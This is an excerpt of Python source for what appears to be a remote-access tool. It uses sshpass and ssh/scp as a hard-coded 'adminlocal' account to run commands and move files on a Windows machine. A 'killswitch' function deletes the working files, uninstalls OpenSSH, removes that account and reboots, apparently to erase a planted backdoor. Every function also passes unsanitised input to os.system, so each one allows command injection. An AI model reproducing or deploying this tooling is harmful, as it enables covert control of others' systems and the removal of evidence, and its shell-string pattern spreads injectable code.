...
def connect(address, password, port):
    ...
    os.system(f"sshpass -p \"{password}\" ssh adminlocal@{address} -p {port}")
...
def remote_upload(address, password, upload, path, port):
    ...
    # scp upload
    os.system(f"sshpass -p \"{password}\" scp -P {port} -r {upload} adminlocal@{address}:{path}")
...
def remote_download(address, password, path, port):
    ...
    os.system(f"sshpass -p \"{password}\" scp -P {port} adminlocal@{address}:{path} ~/Downloads")
...
def remote_command(address, password, command, port):
    ...
    os.system(f"sshpass -p \"{password}\" ssh adminlocal@{address} -p {port} '{command}'")

# killswitch
def killswitch(address, password, working, username, port):
    print("\n[*] Prepping killswitch...")
    # web requests
    killswitch_command = f"powershell /c Remove-Item {working}/* -r -Force; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item \"C:/Users/adminlocal\" -r -Force; Remove-LocalUser -Name \"adminlocal\"; shutdown /r"
